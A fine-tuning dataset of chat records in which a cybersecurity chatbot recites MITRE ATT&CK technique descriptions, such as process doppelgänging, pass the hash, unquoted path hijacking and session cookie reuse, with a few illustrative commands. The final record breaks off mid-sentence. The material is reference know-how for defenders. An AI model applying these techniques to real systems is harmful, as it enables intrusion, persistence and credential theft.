{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Asymmetric Cryptography' and with the Id: T1573.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Asymmetric Cryptography' and with the Id: T1573.002 is described as follows: Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration to Cloud Storage' and with the Id: T1567.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration to Cloud Storage' and with the Id: T1567.002 is described as follows: Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Lateral Tool Transfer' and with the Id: T1570 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Lateral Tool Transfer' and with the Id: T1570 is described as follows: Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002) to connected network shares or with authenticated connections via [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001).(Citation: Unit42 LockerGoga 2019)Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp](https://attack.mitre.org/software/S0095). In some cases, adversaries may be able to leverage [Web Service](https://attack.mitre.org/techniques/T1102)s such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.(Citation: Dropbox Malware Sync). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Path Interception by Unquoted Path' and with the Id: T1574.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Path Interception by Unquoted Path' and with the Id: T1574.009 is described as follows: Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths (Citation: Microsoft CurrentControlSet Services) and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Help eliminate unquoted path) (stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: Windows Unquoted Services) (Citation: Windows Privilege Escalation Guide)This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Install Digital Certificate' and with the Id: T1608.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Install Digital Certificate' and with the Id: T1608.003 is described as follows: Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Job Scheduling' and with the Id: T1168 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Job Scheduling' and with the Id: T1168 is described as follows: On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).### cronSystem-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.### atThe at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.### launchdEach launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Setuid and Setgid' and with the Id: T1166 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Setuid and Setgid' and with the Id: T1166 is described as follows: When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  (Citation: setuid man page). Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn\u2019t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user\u2019s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  (Citation: OSX Keydnap malware).. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Startup Items' and with the Id: T1037.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Startup Items' and with the Id: T1037.005 is described as follows: Adversaries may use startup items automatically executed at boot initialization to establish persistence. Startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items.(Citation: Startup Items)This is technically a deprecated technology (superseded by [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. An adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism.(Citation: Methods of Mac Malware Persistence) Additionally, since StartupItems run during the bootup phase of macOS, they will run as the elevated root user.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Shell' and with the Id: T1100 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Shell' and with the Id: T1100 is described as follows: A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.. The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Doppelg\u00e4nging' and with the Id: T1186 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Doppelg\u00e4nging' and with the Id: T1186 is described as follows: Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. (Citation: Microsoft TxF) To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. (Citation: Microsoft Basic TxF Concepts) To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. (Citation: Microsoft Where to use TxF)Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)Adversaries may leverage TxF to a perform a file-less variation of [Process Injection](https://attack.mitre.org/techniques/T1055) called Process Doppelg\u00e4nging. Similar to [Process Hollowing](https://attack.mitre.org/techniques/T1093), Process Doppelg\u00e4nging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelg\u00e4nging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext. (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017)Process Doppelg\u00e4nging is implemented in 4 steps (Citation: BlackHat Process Doppelg\u00e4nging Dec 2017):* Transact \u2013 Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.* Load \u2013 Create a shared section of memory and load the malicious executable.* Rollback \u2013 Undo changes to original executable, effectively removing malicious code from the file system.* Animate \u2013 Create a process from the tainted section of memory and initiate execution.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SSH Hijacking' and with the Id: T1184 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SSH Hijacking' and with the Id: T1184 is described as follows: Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial. (Citation: Slideshare Abusing SSH) (Citation: SSHjack Blackhat) (Citation: Clockwork SSH Agent Hijacking) Compromising the SSH agent also provides access to intercept SSH credentials. (Citation: Welivesecurity Ebury SSH)[SSH Hijacking](https://attack.mitre.org/techniques/T1184) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it injects into an existing SSH session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Language Discovery' and with the Id: T1614.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Language Discovery' and with the Id: T1614.001 is described as follows: Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)There are various sources of data an adversary could use to infer system language, such as system defaults and keyboard layouts. Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Query Registry](https://attack.mitre.org/techniques/T1012) and calls to [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language</code> or parsing the outputs of Windows API functions <code>GetUserDefaultUILanguage</code>, <code>GetSystemDefaultUILanguage</code>, <code>GetKeyboardLayoutList</code> and <code>GetUserDefaultLangID</code>.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelg\u00e4nging May 2018)On a macOS or Linux system, adversaries may query <code>locale</code> to retrieve the value of the <code>$LANG</code> environment variable.. The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Non-Application Layer Protocol' and with the Id: T1095 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Non-Application Layer Protocol' and with the Id: T1095 is described as follows: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).ICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts.(Citation: Microsoft ICMP) However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.. The systems targeted by this attack pattern are: Windows, Linux, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Pass the Hash' and with the Id: T1075 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Pass the Hash' and with the Id: T1075 is described as follows: Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. (Citation: NSA Spotting). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steganography' and with the Id: T1027.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steganography' and with the Id: T1027.003 is described as follows: Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.[Duqu](https://attack.mitre.org/software/S0038) was an early example of malware that used steganography. It encrypted the gathered information from a victim's system and hid it within an image before exfiltrating the image to a C2 server.(Citation: Wikipedia Duqu) By the end of 2017, a threat group used\u202f<code>Invoke-PSImage</code>\u202fto hide [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands in an image file (.png) and execute the code on a victim's system. In this particular case the [PowerShell](https://attack.mitre.org/techniques/T1059/001) code downloaded another obfuscated script to gather intelligence from the victim's machine and communicate it back to the adversary.(Citation: McAfee Malicious Doc Targets Pyeongchang Olympics)  . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'DNS Server' and with the Id: T1584.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'DNS Server' and with the Id: T1584.002 is described as follows: Adversaries may compromise third-party DNS servers that can be used during targeting. During post-compromise activity, adversaries may utilize DNS traffic for various tasks, including for Command and Control (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)). Instead of setting up their own DNS servers, adversaries may compromise third-party DNS servers in support of operations.By compromising DNS servers, adversaries can alter DNS records. Such control can allow for redirection of an organization's traffic, facilitating Collection and Credential Access efforts for the adversary.(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye DNS Hijack 2019)  Additionally, adversaries may leverage such control in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004) to redirect traffic to adversary-controlled infrastructure, mimicking normal trusted network communications.(Citation: FireEye DNS Hijack 2019)(Citation: Crowdstrike DNS Hijack 2019) Adversaries may also be able to silently create subdomains pointed at malicious servers without tipping off the actual owner of the DNS server.(Citation: CiscoAngler)(Citation: Proofpoint Domain Shadowing). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Protocol Impersonation' and with the Id: T1001.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Protocol Impersonation' and with the Id: T1001.003 is described as follows: Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. . The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Query Registry' and with the Id: T1012 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Query Registry' and with the Id: T1012 is described as follows: Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the [Reg](https://attack.mitre.org/software/S0075) utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Transfer Size Limits' and with the Id: T1030 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Transfer Size Limits' and with the Id: T1030 is described as follows: An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Remote Management' and with the Id: T1028 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Remote Management' and with the Id: T1028 is described as follows: Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). (Citation: Microsoft WinRM) It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. (Citation: Jacobsen 2014). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Session Cookie' and with the Id: T1550.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Session Cookie' and with the Id: T1550.004 is described as follows: Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019). The systems targeted by this attack pattern are: Office 365, SaaS, Google Workspace, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Accounts' and with the Id: T1078.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Accounts' and with the Id: T1078.002 is described as follows: Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.(Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) or password reuse, allowing access to privileged resources of the domain.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Regsvcs/Regasm' and with the Id: T1218.009 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Regsvcs/Regasm' and with the Id: T1218.009 is described as follows: Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) assemblies. Both are binaries that may be digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Path Interception' and with the Id: T1034 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Path Interception' and with the Id: T1034 is described as follows: **This technique has been deprecated. Please use [Path Interception by PATH Environment Variable](https://attack.mitre.org/techniques/T1574/007), [Path Interception by Search Order Hijacking](https://attack.mitre.org/techniques/T1574/008), and/or [Path Interception by Unquoted Path](https://attack.mitre.org/techniques/T1574/009).**Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function. (Citation: TechNet MS14-019)There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.### Unquoted PathsService paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> vs. <code>\"C:\\safe path with space\\program.exe\"</code>). (Citation: Baggett 2012) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at <code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan 2018)### PATH Environment Variable MisconfigurationThe PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., <code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.For example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\\example path</code> will be called instead of the Windows system \"net\" when \"net\" is executed from the command-line.### Search Order HijackingSearch order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argument <code>net user</code>. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", then <code>cmd.exe /C net user</code> will execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT. (Citation: MSDN Environment Property)Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Session Cookie' and with the Id: T1506 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Session Cookie' and with the Id: T1506 is described as follows: Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie)Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), the adversary then imports the cookie into a browser they control and is able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019) . The systems targeted by this attack pattern are: Office 365, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Install Root Certificate' and with the Id: T1553.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Install Root Certificate' and with the Id: T1553.004 is described as follows: Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental)Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide 